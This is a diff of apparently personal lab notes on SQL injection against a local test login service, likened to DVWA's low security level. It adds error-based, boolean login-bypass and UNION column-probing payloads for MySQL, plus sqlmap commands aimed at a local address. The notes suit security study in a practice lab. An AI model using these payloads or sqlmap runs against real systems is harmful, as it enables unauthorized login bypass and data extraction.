@@ -1,29 +1,45 @@
 SQL injection can be performed based on the cheatsheets, possibly following an order:
 
-error-based
 
-Boolean conidtion
-
-union-based
 
 
 % I assume that the 'map' java backends are of the same security level as DVWA low;
 
 % For MySQL, perform the following steps
 
+error-based [payload only]
+AND extractvalue(rand(),concat(0x3a,version()))--
+'
+
+Boolean conidtion
+1234 // wrong password
+1234 OR 1=1
+1234 OR username="Chris" // when user name is "Chris"
+
+
+union-based
+UNION SELECT NULL,--
+UNION SELECT NULL,NULL--
+UNION SELECT NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+// in our scenario, the server check whether their is exactly one matching tuple in the user table in the database.
+// the web application server then return a binary result: logged in or password incorrect
+// therefore, UNION based technique may not be usefull as it cannot retrieve tuples / number of columns from the the login interface
+
+
+//////////////////////////////////////////////////////////////////////////////
+
+sqlmap commands
+sudo sqlmap -u "http://10.0.2.2:9090/login?username="Chris"&password=123456" -p username
+sudo sqlmap -u "http://10.0.2.2:9090/login?username="Chris"&password=123456" -p password
 
 
 
 
-
-
-
-
-
-
-
-
-
+///////////////////////////////////////////////////////////////////////////////
 
 
 % DVWA use MariaDB, with all steps avaialble here: https://www.golinuxcloud.com/dvwa-sql-injection/#Pre-requisites
